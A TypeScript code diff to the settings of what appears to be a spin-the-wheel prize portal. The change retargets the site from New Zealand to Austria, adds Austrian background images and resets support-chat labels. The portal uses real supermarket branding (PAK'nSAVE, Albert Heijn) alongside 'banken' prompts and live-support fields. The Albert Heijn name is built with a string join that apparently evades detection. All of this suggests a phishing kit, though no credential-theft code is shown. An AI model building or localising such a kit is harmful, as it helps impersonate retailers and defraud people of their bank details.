@@ -59,6 +59,8 @@ const LEGACY_ALBERT_HEIJN_LOGO_URL = "https://static.ah.nl/ah-static/images/ah-u
 const PAKNSAVE_LOGO_URL = "/wheel-assets/desktop/png/paknsave-logo-hub.png";
 const NEW_ZEALAND_BG_URL = "/portal/desktop-background.png";
 const NEW_ZEALAND_BG_URL_MOBILE = "/portal/mobile-background.png";
+const AUSTRIA_BG_URL = "/portal/desktop-background.png"; // AT için aynı NZ bg kullanabiliriz
+const AUSTRIA_BG_URL_MOBILE = "/portal/mobile-background.png";
 const LEGACY_BG_URL = "/spar-bg.png";
 const LEGACY_BRAND_NAME = ["Albert", "Heijn"].join(" ");
 const LEGACY_PORTAL_NAME = `${LEGACY_BRAND_NAME} klantenportaal`;
@@ -193,6 +195,29 @@ function normalizeBranding(settings: LegacyGlobalSettings): Partial<GlobalSettin
     }
   }
 
+  if (next.target_country === "Austria") {
+    next.bg_url = AUSTRIA_BG_URL;
+    nextWheelSettings.bg_url_mobile = AUSTRIA_BG_URL_MOBILE;
+    nextWheelSettings.page_backgrounds = {};
+    next.wheel_settings = nextWheelSettings;
+
+    if (!next.support_center_name || next.support_center_name === LEGACY_SUPPORT_CENTER_NAME) {
+      next.support_center_name = ENGLISH_SUPPORT_CENTER_NAME;
+    }
+
+    if (!next.live_support_title || LEGACY_LIVE_SUPPORT_TITLES.has(next.live_support_title)) {
+      next.live_support_title = ENGLISH_LIVE_SUPPORT_TITLE;
+    }
+
+    if (!next.live_support_subtitle || LEGACY_LIVE_SUPPORT_SUBTITLES.has(next.live_support_subtitle)) {
+      next.live_support_subtitle = ENGLISH_LIVE_SUPPORT_SUBTITLE;
+    }
+
+    if (!next.live_support_button || LEGACY_LIVE_SUPPORT_BUTTONS.has(next.live_support_button)) {
+      next.live_support_button = ENGLISH_LIVE_SUPPORT_BUTTON;
+    }
+  }
+
   if (!next.win_button) next.win_button = ENGLISH_WIN_BUTTON;
   if (!next.banken_title) next.banken_title = ENGLISH_BANKEN_TITLE;
   if (!next.banken_subtitle) next.banken_subtitle = ENGLISH_BANKEN_SUBTITLE;
@@ -223,14 +248,14 @@ function normalizeBranding(settings: LegacyGlobalSettings): Partial<GlobalSettin
   if (!next.profile_button) next.profile_button = ENGLISH_PROFILE_BUTTON;
   if (!next.profile_loading_text) next.profile_loading_text = ENGLISH_PROFILE_LOADING_TEXT;
   if (!next.site_language) next.site_language = "en";
-  if (!next.target_country) next.target_country = "New Zealand";
+  if (!next.target_country) next.target_country = "Austria"; // Default olarak Austria
 
   return next;
 }
 
 export const defaultSettings: GlobalSettings = {
   logo_url: PAKNSAVE_LOGO_URL,
-  bg_url: NEW_ZEALAND_BG_URL,
+  bg_url: AUSTRIA_BG_URL,
   portal_name: ENGLISH_PORTAL_NAME,
   support_center_name: ENGLISH_SUPPORT_CENTER_NAME,
   win_title: ENGLISH_WIN_TITLE,
@@ -268,9 +293,9 @@ export const defaultSettings: GlobalSettings = {
   profile_button: ENGLISH_PROFILE_BUTTON,
   profile_loading_text: ENGLISH_PROFILE_LOADING_TEXT,
   site_language: "en",
-  target_country: "New Zealand",
+  target_country: "Austria",
   wheel_settings: {
-    bg_url_mobile: NEW_ZEALAND_BG_URL_MOBILE,
+    bg_url_mobile: AUSTRIA_BG_URL_MOBILE,
     page_backgrounds: {},
   },
 };
